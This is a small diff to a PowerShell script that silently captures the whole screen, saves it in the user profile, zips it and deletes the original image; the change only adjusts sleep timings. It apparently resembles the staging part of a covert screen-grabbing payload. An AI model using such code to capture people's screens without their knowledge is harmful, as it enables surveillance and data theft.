@@ -1,4 +1,3 @@
-Start-Sleep(3)
 $File = "$env:userprofile\sc"
 Add-Type -AssemblyName System.Windows.Forms
 Add-type -AssemblyName System.Drawing
@@ -10,6 +9,7 @@ $Top = $Screen.Top
 $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
 $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+sleep(1)
 $bitmap.Save("$File") 
 Compress-Archive $File -C Optimal -D "$file.zip" -F
 Remove-Item $File
